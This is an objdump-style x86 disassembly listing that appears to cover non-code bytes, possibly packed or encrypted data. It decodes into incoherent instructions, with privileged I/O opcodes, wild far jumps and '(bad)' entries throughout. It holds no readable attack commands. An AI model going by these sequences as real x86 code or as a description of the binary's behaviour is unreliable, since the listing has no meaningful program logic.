  41ad77:	sub    ch,bl
  41ad79:	in     eax,0x93
  41ad7b:	dec    esi
  41ad7c:	xor    DWORD PTR [esi+0xbf757df],eax
  41ad82:	mov    DWORD PTR [eax+0x7661ee57],esp
  41ad88:	out    dx,eax
  41ad89:	mov    esi,0x767fab46
  41ad8e:	ins    DWORD PTR es:[edi],dx
  41ad8f:	xchg   edx,eax
	...
  41adf4:	push   ebp
  41adf5:	clc    
  41adf6:	or     DWORD PTR [esi-0x4280053],ebx
  41adfc:	dec    edi
  41adfd:	push   eax
  41adfe:	cmp    DWORD PTR [esi+eax*4+0x4cda5c5],esp
  41ae05:	sbb    eax,0x1040001
  41ae0a:	add    BYTE PTR [eax],al
  41ae0c:	inc    eax
  41ae0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae0e:	aaa    
  41ae0f:	sbb    al,0xdd
  41ae11:	add    ah,BYTE PTR [ecx-0x70]
  41ae14:	jns    0x41ada1
  41ae16:	mov    al,0xd6
  41ae18:	shl    esp,0x5d
  41ae1b:	cmp    al,0xb7
  41ae1d:	inc    edx
  41ae1e:	addr16 add eax,0xae94adcb
  41ae24:	xchg   ebp,eax
  41ae25:	jle    0x41ae11
  41ae27:	into   
  41ae28:	adc    BYTE PTR [ebp-0x2a9af268],0x8f
  41ae2f:	shr    BYTE PTR [edx+ebx*2+0x38],cl
  41ae33:	adc    eax,0x4c7b6e60
  41ae38:	sahf   
  41ae39:	imul   esi,DWORD PTR [esp+edi*2-0x20],0xbc08bdae
  41ae41:	ins    BYTE PTR es:[edi],dx
  41ae42:	retf   0x8c4
  41ae45:	test   BYTE PTR [eax+0x6fc56d5f],dh
  41ae4b:	and    DWORD PTR [esp+eax*8+0x123365db],eax
  41ae52:	or     eax,0xc3845296
  41ae57:	push   ecx
  41ae58:	mov    ah,ah
  41ae5a:	or     di,WORD PTR [edx]
  41ae5d:	std    
  41ae5e:	hlt    
  41ae5f:	adc    eax,0x7cffe350
  41ae64:	std    
  41ae65:	mov    esp,0x425d12
  41ae6a:	or     eax,0x6db93a32
  41ae6f:	enter  0xa6d5,0xd4
  41ae73:	adc    ecx,DWORD PTR ds:0x8854b227
  41ae79:	test   al,0x1b
  41ae7b:	xor    DWORD PTR [eax+0x7],0x6dfc5bee
  41ae82:	mov    dh,0x75
  41ae84:	test   DWORD PTR [ebp+0x68],ebx
  41ae87:	cwde   
  41ae88:	cdq    
  41ae89:	std    
  41ae8a:	mov    dl,0x27
  41ae8c:	pop    esp
  41ae8d:	or     DWORD PTR ds:0xecca14ee,0xffffffef
  41ae94:	xchg   ebx,eax
  41ae95:	push   esi
  41ae96:	mov    ah,0xc7
  41ae98:	test   al,0xaa
  41ae9a:	addr16 (bad) 
  41ae9c:	cwde   
  41ae9d:	inc    ecx
  41ae9e:	aaa    
  41ae9f:	shl    DWORD PTR [ebx+ecx*4-0x65],1
  41aea3:	scas   al,BYTE PTR es:[edi]
  41aea4:	lock pop edx
  41aea6:	cmp    eax,0xe4746525
  41aeab:	adc    ebp,0x49
  41aeae:	cs dec ebp
  41aeb0:	cmp    edx,DWORD PTR [ecx-0x62]
  41aeb3:	jb     0x41aef2
  41aeb5:	dec    DWORD PTR [ebp-0x18ae9010]
  41aebb:	push   ss
  41aebc:	jae    0x41af1f
  41aebe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aebf:	xor    BYTE PTR [ebp+0x375e19b5],0x90
  41aec6:	repnz xor BYTE PTR [ecx+0x51],dl
  41aeca:	xor    BYTE PTR [esi],ch
  41aecc:	js     0x41aeff
  41aece:	sbb    ebp,DWORD PTR es:[edx+edx*1]
  41aed2:	mov    al,0xd1
  41aed4:	xor    DWORD PTR [edx-0x73],esp
  41aed7:	and    ecx,ebp
  41aed9:	out    0xc6,eax
  41aedb:	cdq    
  41aedc:	jns    0x41af07
  41aede:	jecxz  0x41af00
  41aee0:	gs pusha 
  41aee2:	icebp  
  41aee3:	daa    
  41aee4:	and    eax,0xf5d3bb6b
  41aee9:	sub    edi,eax
  41aeeb:	mov    ah,0x3f
  41aeed:	out    dx,al
  41aeee:	das    
  41aeef:	add    DWORD PTR [edx+0x17a80f3c],0xad3a1d5e
  41aef9:	adc    DWORD PTR [ecx],edx
  41aefb:	dec    ebp
  41aefc:	repz enter 0x32ba,0x7
  41af01:	(bad)  
  41af02:	in     eax,0x51
  41af04:	frstor [edx+eiz*1]
  41af07:	rcr    BYTE PTR [ebx-0x5c],1
  41af0a:	in     al,dx
  41af0b:	leave  
  41af0c:	mov    cl,0x6c
  41af0e:	cmp    cl,BYTE PTR [ebp+0x0]
	...
  41af74:	(bad)  
  41af77:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41af7d:	mov    ecx,0xe7d44ee
  41af82:	push   ecx
  41af83:	mov    cl,BYTE PTR [eax]
  41af85:	push   ds
  41af86:	add    DWORD PTR [eax],eax
  41af88:	add    al,0x1
  41af8a:	add    BYTE PTR [eax],al
  41af8c:	lds    ebx,FWORD PTR [ebx+0x4cf3d640]
  41af92:	ret    
  41af93:	mov    al,0xe
  41af95:	xlat   BYTE PTR ds:[ebx]
  41af96:	jnp    0x41af33
  41af98:	xchg   dh,ah
  41af9a:	pusha  
  41af9b:	ins    BYTE PTR es:[edi],dx
  41af9c:	sub    esp,esi
  41af9e:	repnz xor edx,ebp
  41afa1:	test   eax,0x630b8cd8
  41afa6:	xchg   esi,eax
  41afa7:	retf   
  41afa8:	sub    BYTE PTR [edi+0x53],0x99
  41afac:	ins    BYTE PTR es:[edi],dx
  41afad:	and    ah,BYTE PTR [esp+ecx*1+0x44]
  41afb1:	mul    DWORD PTR gs:[ebx]
  41afb4:	sub    dh,BYTE PTR [ebx+0x211c01ba]
  41afba:	push   edx
  41afbb:	mov    ds:0x9f2d4243,al
  41afc0:	loope  0x41afe6
  41afc2:	jmp    0xc6ef:0x51f0d5b8
  41afc9:	xor    ch,BYTE PTR [ebx+ecx*2]
  41afcc:	or     BYTE PTR [edi],cl
  41afce:	adc    BYTE PTR [esi],bl
  41afd0:	cmp    BYTE PTR [edi+0x13348725],al
  41afd6:	adc    edi,DWORD PTR [ecx]
  41afd8:	leave  
  41afd9:	mov    dl,dh
  41afdb:	push   es
  41afdc:	je     0x41aff6
  41afde:	xchg   edi,eax
  41afdf:	call   0x449:0x6b5dd62d
  41afe6:	cdq    
  41afe7:	stos   DWORD PTR es:[edi],eax
  41afe8:	jmp    0x41b034
  41afea:	jne    0x41b02d
  41afec:	pop    edi
  41afed:	xchg   esp,eax
  41afee:	or     al,0xd8
  41aff0:	cmp    dl,BYTE PTR [eax]
  41aff2:	xor    al,0x52
  41aff4:	fsub   QWORD PTR [ecx]
  41aff6:	ss jbe 0x41b051
  41aff9:	mov    esp,0x3de749fc
  41affe:	xchg   edi,eax
  41afff:	sub    esp,ebx
  41b001:	mov    ch,0x21
  41b003:	pop    eax
  41b004:	lods   eax,DWORD PTR ds:[esi]
  41b005:	ror    dl,1
  41b007:	lods   eax,DWORD PTR ds:[esi]
  41b008:	sub    dh,al
  41b00a:	dec    esi
  41b00b:	pop    edi
  41b00c:	inc    edi
  41b00d:	jne    0x41af91
  41b00f:	loop   0x41b07e
  41b011:	inc    ebp
  41b012:	xchg   esi,eax
  41b013:	pop    ebx
  41b014:	adc    DWORD PTR [edi+0x5c19699e],0x4d
  41b01b:	sbb    dh,BYTE PTR [esi+0x1fbee419]
  41b021:	aaa    
  41b022:	call   0xacc29ff5
  41b027:	lods   al,BYTE PTR ds:[esi]
  41b028:	scas   al,BYTE PTR es:[edi]
  41b029:	fwait
  41b02a:	push   esp
  41b02b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b02c:	xchg   ebp,eax
  41b02d:	xchg   BYTE PTR [ebx+0x5c],dl
  41b030:	int    0x16
  41b032:	sub    DWORD PTR [esi+ebx*2],esi
  41b035:	or     DWORD PTR ds:0xa8c5c5a7,ecx
  41b03b:	or     al,0x19
  41b03d:	cdq    
  41b03e:	sbb    eax,0xbc139c26
  41b043:	mov    BYTE PTR [esi],bl
  41b045:	and    bl,BYTE PTR [ebx-0xfb7e662]
  41b04b:	iret   
  41b04c:	and    al,0xcc
  41b04e:	mov    dh,0xe4
  41b050:	adc    al,0xec
  41b052:	xchg   edx,eax
  41b053:	push   eax
  41b054:	adc    al,0x28
  41b056:	jbe    0x41b048
  41b058:	inc    esp
  41b059:	pop    eax
  41b05a:	bound  ebp,QWORD PTR [esp+ebx*8+0x3f831e0d]
  41b061:	sub    eax,0x5ec6938c
  41b066:	and    cl,dh
  41b068:	and    ebp,DWORD PTR [esi]
  41b06a:	dec    ebp
  41b06b:	inc    ecx
  41b06c:	pop    esi
  41b06d:	mov    ?,WORD PTR ds:0x9a766732
  41b073:	jg     0x41affb
  41b075:	adc    eax,0xe8a89081
  41b07a:	sub    BYTE PTR [ecx+0x6e2c983f],bl
  41b080:	jnp    0x41b094
  41b082:	(bad)  
  41b083:	push   0x59
  41b085:	or     al,0xb2
  41b087:	jl     0x41b0e6
  41b089:	sar    edx,1
  41b08b:	je     0x41b0e3
  41b08d:	enter  0x2b0d,0x0
	...
  41b0f1:	add    BYTE PTR [eax],al
  41b0f3:	add    dh,al
  41b0f5:	ficom  WORD PTR [eax]
  41b0f7:	stos   DWORD PTR es:[edi],eax
  41b0f8:	sbb    bh,ch
  41b0fa:	(bad)  
  41b0fb:	call   DWORD PTR [edx+edx*8+0x75]
  41b0ff:	mov    edi,0xd318c02e
  41b104:	or     al,0x1f
  41b106:	add    DWORD PTR [eax],eax
  41b108:	add    al,0x1
  41b10a:	add    BYTE PTR [eax],al
  41b10c:	repnz pop eax
  41b10e:	dec    ecx
  41b10f:	call   0x270c6463
  41b114:	outs   dx,BYTE PTR ds:[esi]
  41b115:	and    DWORD PTR [ebp+0x9],0x31
  41b119:	and    DWORD PTR [ebp-0x67c47cf],esp
  41b11f:	and    bl,BYTE PTR [eax+ecx*8]
  41b122:	aaa    
  41b123:	xchg   ebx,eax
  41b124:	jmp    0xff0dc9c2
  41b129:	and    esp,ebp
  41b12b:	mov    eax,0x1c44f096
  41b130:	cmc    
  41b131:	xlat   BYTE PTR ds:[ebx]
  41b132:	call   0x33df2e60
  41b137:	sub    edi,DWORD PTR [edx-0x2a]
  41b13a:	jp     0x41b0ce
  41b13c:	sbb    eax,0xace20185
  41b141:	xchg   DWORD PTR [ebx-0x2f0329bb],ebp
  41b147:	ins    DWORD PTR es:[edi],dx
  41b148:	cmc    
  41b149:	fisttp WORD PTR [ebx+ecx*2]
  41b14c:	xchg   ecx,eax
  41b14d:	mov    edi,0x16e1fc75
  41b152:	mov    BYTE PTR [esi-0x12],dl
  41b155:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b156:	and    edx,eax
  41b158:	test   ah,bl
  41b15a:	jo     0x41b19a
  41b15c:	and    bl,bh
  41b15e:	mov    cl,0x54
  41b160:	add    esp,DWORD PTR [eax]
  41b162:	int    0xaf
  41b164:	sar    BYTE PTR [ebp+0x7e4ed945],1
  41b16a:	icebp  
  41b16b:	and    dh,dh
  41b16d:	xchg   DWORD PTR [edi+0x2e],esp
  41b170:	add    DWORD PTR [ebx+ebp*8-0x47],0xffffffe9
  41b175:	jmp    0xab6bb228
  41b17a:	push   esp
  41b17b:	outs   dx,BYTE PTR ds:[esi]
  41b17c:	xor    eax,ebp
  41b17e:	(bad)  
  41b17f:	bound  eax,QWORD PTR [edx+edi*2]
  41b182:	mov    cl,0xa2
  41b184:	sbb    al,0xbe
  41b186:	xchg   ebp,eax
  41b187:	in     eax,dx
  41b188:	pushf  
  41b189:	mov    cl,0xba
  41b18b:	(bad)  
  41b18c:	and    ah,al
  41b18e:	addr16 mov bl,0x8a
  41b191:	popa   
  41b192:	and    bh,BYTE PTR [ecx]
  41b194:	mov    esp,0xe9ddf68c
  41b199:	pop    ecx
  41b19a:	mov    ds:0x118a5252,al
  41b19f:	in     eax,dx
  41b1a0:	push   esi
  41b1a1:	repz sbb BYTE PTR [ebx+0x3f],0x8c
  41b1a6:	mov    WORD PTR [edx],fs
  41b1a8:	or     al,0xe6
  41b1aa:	lds    esi,FWORD PTR [esi-0x5e4d0ecb]
  41b1b0:	fistp  QWORD PTR [eax]
  41b1b2:	and    esp,DWORD PTR [esi+0x2b]
  41b1b5:	in     al,dx
  41b1b6:	mov    WORD PTR [ebx+0xa8993e],cs
  41b1bc:	xor    BYTE PTR [edx],cl
  41b1be:	jmp    0x9b4c:0x3632496c
  41b1c5:	xlat   BYTE PTR ds:[ebx]
  41b1c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1c7:	fidivr WORD PTR [edi-0x18]
  41b1ca:	and    edx,DWORD PTR [eax-0x5cc8123b]
  41b1d0:	push   ecx
  41b1d1:	add    al,BYTE PTR [ebx-0xd]
  41b1d4:	jo     0x41b203
  41b1d6:	or     DWORD PTR [edx+0x7a],edx
  41b1d9:	gs iret 
  41b1db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1dc:	mov    esp,0xbe88a222
  41b1e1:	pop    edi
  41b1e2:	call   esi
  41b1e4:	cmp    edi,DWORD PTR [eax-0x4d]
  41b1e7:	jbe    0x41b1a6
  41b1e9:	sub    al,BYTE PTR [ecx]
  41b1eb:	imul   esi,DWORD PTR [ecx+0x13],0x5e
  41b1ef:	daa    
  41b1f0:	inc    esp
  41b1f1:	dec    ebx
  41b1f2:	iret   
  41b1f3:	mov    eax,ds:0x6ca2f9b
  41b1f8:	sbb    al,0xc8
  41b1fa:	or     BYTE PTR [ebp-0x1f96f28a],bh
  41b200:	pop    ebx
  41b201:	jns    0x41b246
  41b203:	ins    DWORD PTR es:[edi],dx
  41b204:	xor    eax,ecx
  41b206:	aas    
  41b207:	popf   
  41b208:	sub    dl,BYTE PTR [edx+0x2f]
  41b20b:	and    eax,0x839cc56d
	...
  41b274:	mov    fs,WORD PTR [ebp-0x13941f97]
  41b27a:	(bad)  
  41b27b:	out    dx,eax
  41b27c:	stos   BYTE PTR es:[edi],al
  41b27d:	jge    0x41b21a
  41b27f:	or     BYTE PTR [ecx+0x1092140a],al
  41b285:	and    BYTE PTR [ecx],al
  41b287:	add    BYTE PTR [ecx+eax*1],al
  41b28a:	add    BYTE PTR [eax],al
  41b28c:	add    bl,dl
  41b28e:	mov    edx,0xe8f74b2c
  41b293:	pop    edi
  41b294:	push   eax
  41b295:	ja     0x41b272
  41b297:	shl    BYTE PTR [ebx],0x98
  41b29a:	fcomip st,st(0)
  41b29c:	repz xchg esp,eax
  41b29e:	inc    edi
  41b29f:	lea    edx,[edx+0x39]
  41b2a2:	mov    cs,eax
  41b2a4:	cs nop
  41b2a6:	mov    BYTE PTR [edi-0x6d7e93e2],ch
  41b2ac:	dec    esi
  41b2ad:	mov    eax,0xdce5436
  41b2b2:	jmp    0x530a:0x7a7c33f3
  41b2b9:	jecxz  0x41b2f9
  41b2bb:	push   esp
  41b2bc:	push   eax
  41b2bd:	inc    ebx
  41b2be:	es xchg esi,eax
  41b2c0:	iret   
  41b2c1:	push   cs
  41b2c2:	ins    BYTE PTR es:[edi],dx
  41b2c3:	pop    ebx
  41b2c4:	ds nop
  41b2c6:	retf   
  41b2c7:	hlt    
  41b2c8:	pop    ecx
  41b2c9:	and    al,0x4a
  41b2cb:	enter  0x3bf9,0xd6
  41b2cf:	xor    dh,BYTE PTR ds:0xe97f718b
  41b2d5:	add    eax,0x5a0ae73c
  41b2da:	out    dx,al
  41b2db:	test   al,0x3c
  41b2dd:	fiadd  WORD PTR [edx]
  41b2df:	popf   
  41b2e0:	js     0x41b26f
  41b2e2:	cmp    al,0xbf
  41b2e4:	or     dh,BYTE PTR [eax-0x71]
  41b2e7:	cli    
  41b2e8:	push   ds
  41b2e9:	ror    BYTE PTR [ebx-0xaf02234],0x8e
  41b2f0:	push   edx
  41b2f1:	xor    al,0xa3
  41b2f3:	jecxz  0x41b32f
  41b2f5:	aas    
  41b2f6:	push   eax
  41b2f7:	xchg   esp,eax
  41b2f8:	std    
  41b2f9:	fld    TBYTE PTR [esp+edx*8]
  41b2fc:	push   0xb3bf0a67
  41b301:	adc    edx,DWORD PTR [edi+0x1334ae5d]
  41b307:	xor    BYTE PTR [ebp+0x37],0x5
  41b30b:	int    0x83
  41b30d:	add    BYTE PTR [ecx],ah
  41b30f:	or     eax,0x46375278
  41b315:	lea    edx,[ebx]
  41b317:	popf   
  41b318:	pop    edi
  41b319:	mov    edi,0xf3eca31b
  41b31e:	jmp    0x41b2d1
  41b320:	repnz dec edx
  41b322:	pop    ebx
  41b323:	std    
  41b324:	add    ch,bl
  41b326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b327:	adc    BYTE PTR [edx+0x78],ch
  41b32a:	mov    cl,0xf1
  41b32c:	sub    bh,dh
  41b32e:	outs   dx,BYTE PTR ds:[esi]
  41b32f:	sahf   
  41b330:	std    
  41b331:	jnp    0x41b312
  41b333:	sub    bl,BYTE PTR [ebp+0x77657311]
  41b339:	scas   eax,DWORD PTR es:[edi]
  41b33a:	xchg   esp,eax
  41b33b:	mov    ecx,0xe9f86e66
  41b340:	cmp    dh,dh
  41b342:	pop    esi
  41b343:	js     0x41b3ac
  41b345:	arpl   di,bx
  41b347:	adc    BYTE PTR [ebp+0x36b3e51],cl
  41b34d:	push   ss
  41b34e:	jne    0x41b341
  41b350:	and    al,0x6e
  41b352:	mov    eax,0xccbf5c69
  41b357:	push   0x33a94ff5
  41b35c:	push   ss
  41b35d:	cs xchg ebx,eax
  41b35f:	cdq    
  41b360:	jae    0x41b327
  41b362:	push   eax
  41b363:	cwde   
  41b364:	adc    ah,BYTE PTR [ebx+edi*1+0x14f75b79]
  41b36b:	fild   DWORD PTR [esi]
  41b36d:	ror    DWORD PTR gs:[esi+0x9],1
  41b371:	xchg   ebp,eax
  41b373:	jle    0x41b332
  41b375:	rcr    DWORD PTR [edx+0x53],1
  41b378:	scas   al,BYTE PTR es:[edi]
  41b379:	xchg   esi,eax
  41b37a:	jg     0x41b3e4
  41b37c:	stos   BYTE PTR es:[edi],al
  41b37d:	test   al,0x23
  41b37f:	xchg   DWORD PTR [edi+0x2cd9e910],edi
  41b385:	arpl   WORD PTR [eax+0x55e35d68],bp
  41b38b:	inc    ebx
  41b38c:	lods   eax,DWORD PTR ds:[esi]
  41b38d:	cmp    eax,0x44e0
	...
  41b3f2:	add    BYTE PTR [eax],al
  41b3f4:	dec    eax
  41b3f5:	or     eax,0xbb5dab1d
  41b3fa:	(bad)  
  41b3fb:	out    dx,eax
  41b3fc:	xchg   ebp,eax
  41b3fd:	iret   
  41b3fe:	push   ebx
  41b3ff:	aas    
  41b400:	mov    WORD PTR [ebp-0x3b],?
  41b403:	not    BYTE PTR [ecx+eiz*1]
  41b406:	add    DWORD PTR [eax],eax
  41b408:	add    al,0x1
  41b40a:	add    BYTE PTR [eax],al
  41b40c:	push   ds
  41b40d:	(bad)  
  41b40f:	pop    ebp
  41b410:	aas    
  41b411:	or     edx,DWORD PTR [edi+0x7b]
  41b414:	outs   dx,BYTE PTR ds:[esi]
  41b415:	rcr    dh,1
  41b417:	push   0xe
  41b419:	jmp    0x41b3d6
  41b41b:	and    ebx,DWORD PTR [ebx-0xd]
  41b41e:	cwde   
  41b41f:	push   cs
  41b420:	dec    ebp
  41b421:	stos   DWORD PTR es:[edi],eax
  41b422:	ret    
  41b423:	test   al,ch
  41b425:	inc    esp
  41b426:	jmp    0xad23e144
  41b42b:	jecxz  0x41b449
  41b42d:	pop    ebp
  41b42e:	xchg   DWORD PTR [esi],esi
  41b430:	mov    bh,0x5f
  41b432:	sub    esi,DWORD PTR [ecx+ecx*4-0x64]
  41b436:	aam    0xac
  41b438:	out    0x4c,al
  41b43a:	pop    ds
  41b43b:	stos   BYTE PTR es:[edi],al
  41b43c:	mov    ah,0x72
  41b43e:	push   esi
  41b43f:	adc    edx,eax
  41b441:	rol    al,1
  41b443:	sti    
  41b444:	xor    ebx,ecx
  41b446:	aad    0x17
  41b448:	dec    esi
  41b449:	mov    WORD PTR [ebp+0x28e7a09a],ds
  41b44f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b450:	add    edi,DWORD PTR [esi+0x14]
  41b453:	push   ecx
  41b454:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b455:	lods   al,BYTE PTR ds:[esi]
  41b456:	and    ecx,DWORD PTR [edx-0x77833a6a]
  41b45c:	out    dx,al
  41b45d:	iret   
  41b45e:	dec    esi
  41b45f:	ror    BYTE PTR [ecx+0x35],cl
  41b462:	scas   al,BYTE PTR es:[edi]
  41b463:	dec    ebp
  41b464:	lods   al,BYTE PTR ds:[esi]
  41b465:	dec    eax
  41b466:	stos   BYTE PTR es:[edi],al
  41b467:	mov    ah,0x5b
  41b469:	arpl   di,ax
  41b46b:	mov    ecx,DWORD PTR [edi+0x78]
  41b46e:	fld    DWORD PTR [edi+0x77]
  41b471:	mov    DWORD PTR [esi-0x766dbd62],eax
  41b477:	fidiv  WORD PTR [ebx-0x70]
  41b47a:	bound  edx,QWORD PTR [esi]
  41b47c:	(bad)  
  41b47d:	leave  
  41b47e:	ret    0x9622
  41b481:	dec    ebp
  41b482:	je     0x41b463
  41b484:	dec    esi
  41b485:	imul   ecx,DWORD PTR [edx-0x40acfcd],0x151215a9
  41b48f:	cdq    
  41b490:	sub    al,0xde
  41b492:	in     eax,dx
  41b493:	data16 fadd QWORD PTR [ecx+edi*1+0x40]
  41b498:	lods   al,BYTE PTR ds:[esi]
  41b499:	xlat   BYTE PTR ds:[ebx]
  41b49a:	jge    0x41b46d
  41b49c:	stos   DWORD PTR es:[edi],eax
  41b49d:	imul   edi,DWORD PTR ds:0x375a6e1f,0xe5f3f1cc
  41b4a7:	inc    ebp
  41b4a8:	pop    es
  41b4a9:	ret    
  41b4aa:	leave  
  41b4ab:	sub    BYTE PTR ds:0xa645ef3d,dl
  41b4b1:	mov    ah,0x90
  41b4b3:	xor    eax,0xcc8d2073
  41b4b8:	dec    ebp
  41b4b9:	stos   DWORD PTR es:[edi],eax
  41b4ba:	sbb    ebp,ecx
  41b4bc:	scas   eax,DWORD PTR es:[edi]
  41b4bd:	cmp    eax,0xd92435af
  41b4c2:	jge    0x41b475
  41b4c4:	sub    ecx,ebx
  41b4c6:	test   eax,0x6fe8d22b
  41b4cb:	loopne 0x41b47d
  41b4cd:	pop    esp
  41b4ce:	loop   0x41b4f7
  41b4d0:	iret   
  41b4d1:	push   0xffffffc5
  41b4d3:	fs daa 
  41b4d5:	js     0x41b502
  41b4d7:	test   BYTE PTR [edx+0x31],dl
  41b4da:	push   ebp
  41b4db:	xor    BYTE PTR [ebx+esi*8],dl
  41b4de:	xchg   edi,eax
  41b4df:	sbb    DWORD PTR [esi+0x9],ecx
  41b4e2:	inc    esi
  41b4e3:	(bad)  
  41b4e5:	jmp    0x79cec805
  41b4ea:	mov    al,0x17
  41b4ec:	push   eax
  41b4ed:	(bad)  
  41b4ee:	xor    al,BYTE PTR [esi+0x476ee255]
  41b4f4:	fnsave [esi+edx*2+0x2496d7f4]
  41b4fb:	xchg   edi,eax
  41b4fc:	pop    ebp
  41b4fd:	cmp    bh,BYTE PTR [ebp+0x6b]
  41b500:	add    al,BYTE PTR [esi]
  41b502:	xor    DWORD PTR [ebx-0x4e5c1878],edx
  41b508:	jae    0x41b55a
  41b50a:	ror    DWORD PTR [esi],0x9c
  41b50d:	jmp    0x41b519
  41b50f:	rol    DWORD PTR [eax],0x0
	...
  41b572:	add    BYTE PTR [eax],al
  41b574:	aam    0xec
  41b576:	add    edi,edi
  41b578:	cmp    edi,edi
  41b57a:	(bad)  
  41b57b:	out    dx,eax
  41b57c:	loope  0x41b544
  41b57e:	jns    0x41b561
  41b580:	and    ch,BYTE PTR [si+0x1801]
  41b585:	and    al,BYTE PTR [ecx]
  41b587:	add    BYTE PTR [ecx+eax*1],al
  41b58a:	add    BYTE PTR [eax],al
  41b58c:	pop    eax
  41b58d:	mov    WORD PTR [eax-0x3d],gs
  41b590:	push   ebx
  41b591:	and    ecx,ebx
  41b593:	mov    ebp,0xa1944600
  41b598:	lock cmp bh,BYTE PTR [eax-0x828f8a9]
  41b59f:	call   0x83e7:0xabe6a35b
  41b5a6:	xchg   DWORD PTR [esi-0x5e15e577],eax
  41b5ac:	rcl    edx,cl
  41b5ae:	pop    es
  41b5af:	push   esi
  41b5b0:	jp     0x41b60f
  41b5b2:	xchg   DWORD PTR [edi+0x52c32b23],esi
  41b5b8:	clc    
  41b5b9:	dec    esp
  41b5ba:	mov    edx,0xf91843a7
  41b5bf:	sbb    DWORD PTR [ecx+0x6a12a9ea],esp
  41b5c5:	pop    ebx
  41b5c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5c7:	mov    ecx,0xf0e4e1d8
  41b5cc:	push   ebp
  41b5cd:	cmp    DWORD PTR [edi+0x5a01e981],edi
  41b5d3:	out    0x81,al
  41b5d5:	rcr    ebx,1
  41b5d7:	je     0x41b5d8
  41b5d9:	jae    0x41b5f1
  41b5db:	lods   al,BYTE PTR ds:[esi]
  41b5dc:	das    
  41b5dd:	ja     0x41b654
  41b5df:	in     eax,dx
  41b5e0:	out    0xca,eax
  41b5e2:	xor    al,0xc5
  41b5e4:	ror    BYTE PTR [ebx+0x39],0x14
  41b5e8:	js     0x41b5ff
  41b5ea:	es jnp 0x41b619
  41b5ed:	imul   eax,DWORD PTR [ebp+0x3],0xdd5715e5
  41b5f4:	pop    eax
  41b5f5:	out    0xf4,al
  41b5f7:	fs mov esp,0x55d9e870
  41b5fd:	or     eax,0x799f824b
  41b602:	adc    al,0xce
  41b604:	lea    ebx,[esi]
  41b606:	in     al,0x46
  41b608:	loopne 0x41b60a
  41b60a:	mov    ds:0x73536c39,al
  41b60f:	clts   
  41b611:	loop   0x41b5e1
  41b613:	adc    ch,bh
  41b615:	push   es
  41b616:	inc    esp
  41b617:	jmp    0xc0f8084b
  41b61c:	mov    cl,0xd
  41b61e:	pop    ebp
  41b61f:	scas   eax,DWORD PTR es:[edi]
  41b620:	bound  edx,QWORD PTR [edx+0x3e29ffd9]
  41b626:	xor    eax,DWORD PTR [esi]
  41b628:	scas   eax,DWORD PTR es:[edi]
  41b629:	mov    WORD PTR [ebp+0x61],fs
  41b62c:	ds ror bl,cl
  41b62f:	outs   dx,BYTE PTR ds:[esi]
  41b630:	or     eax,0xf29c185a
  41b635:	ror    DWORD PTR [ebx],0xda
  41b638:	add    ebp,eax
  41b63a:	jecxz  0x41b661
  41b63c:	shl    BYTE PTR [esi-0x6e68c8cc],0xd9
  41b643:	in     al,dx
  41b644:	push   eax
  41b645:	icebp  
  41b646:	lods   al,BYTE PTR ds:[esi]
  41b647:	jb     0x41b612
  41b649:	and    esp,DWORD PTR [edi+0x403b1541]
  41b64f:	mov    cs,esi
  41b651:	fst    QWORD PTR [ebp-0x1e]
  41b654:	sbb    edx,ebp
  41b656:	lahf   
  41b657:	dec    ecx
  41b658:	inc    DWORD PTR [edi-0x53ae26a2]
  41b65e:	pop    esi
  41b65f:	aas    
  41b660:	and    BYTE PTR [esi-0x56d79e82],dh
  41b666:	mov    eax,ds:0xce69a333
  41b66b:	inc    eax
  41b66c:	xchg   ecx,eax
  41b66d:	mov    dh,cl
  41b66f:	inc    edx
  41b670:	sbb    bh,BYTE PTR [ecx+edi*1-0x3fd95f2]
  41b677:	pop    esi
  41b678:	push   ss
  41b679:	xchg   esi,eax
  41b67b:	pusha  
  41b67c:	xor    ah,BYTE PTR [esi]
  41b67e:	lock ret 
  41b680:	cmp    al,0x3b
  41b682:	mov    ds:0x608f0627,eax
  41b687:	fadd   QWORD PTR [ebx]
  41b689:	dec    esp
  41b68a:	es jno 0x41b6cd
  41b68d:	or     ebx,DWORD PTR [ebx-0xa]
	...
  41b6f4:	test   al,0x63
  41b6f6:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41b6fc:	sti    
  41b6fd:	push   ds
  41b6fe:	mov    ah,dh
  41b700:	adc    esp,DWORD PTR [ecx+0x231cf341]
  41b706:	add    DWORD PTR [eax],eax
  41b708:	add    al,0x1
  41b70a:	add    BYTE PTR [eax],al
  41b70c:	repnz xchg esi,eax
  41b70e:	lods   eax,DWORD PTR ds:[esi]
  41b70f:	pop    eax
  41b710:	ja     0x41b748
  41b712:	shr    BYTE PTR [ebp+0x611f72c5],0x3f
  41b719:	vcmpnlt_uqps ymm1,ymm7,YMMWORD PTR [edx]
  41b71e:	or     BYTE PTR [edx+0x32],0x12
  41b722:	test   al,0x91
  41b724:	sbb    DWORD PTR [eax-0x2f],ecx
  41b727:	sbb    BYTE PTR [ecx+0x24787a6a],dh
  41b72d:	popa   
  41b72e:	push   esp
  41b72f:	cdq    
  41b730:	adc    al,0x3e
  41b732:	aas    
  41b733:	jp     0x41b6be
  41b735:	jg     0x41b71a
  41b737:	pop    ebp
  41b738:	mov    ebp,0x9b552938
  41b73d:	sbb    DWORD PTR [ecx-0x5f],ebp
  41b740:	mov    edx,0xa6b8c90c
  41b745:	pop    es
  41b746:	call   0x99805596
  41b74b:	pop    edi
  41b74c:	mov    eax,0x9965cf96
  41b751:	xor    BYTE PTR [eax],dh
  41b753:	mov    BYTE PTR [edi-0x6b47d111],ah
  41b759:	loop   0x41b7b5
  41b75b:	adc    eax,0x81d1061d
  41b760:	pop    ecx
  41b761:	mov    dl,0x64
  41b763:	push   DWORD PTR [esi+0x27]
  41b766:	inc    ecx
  41b767:	mov    bh,0xa8
  41b769:	push   esp
  41b76a:	test   eax,0x478bca51
  41b76f:	shl    DWORD PTR [ecx+ecx*2-0x77169c38],cl
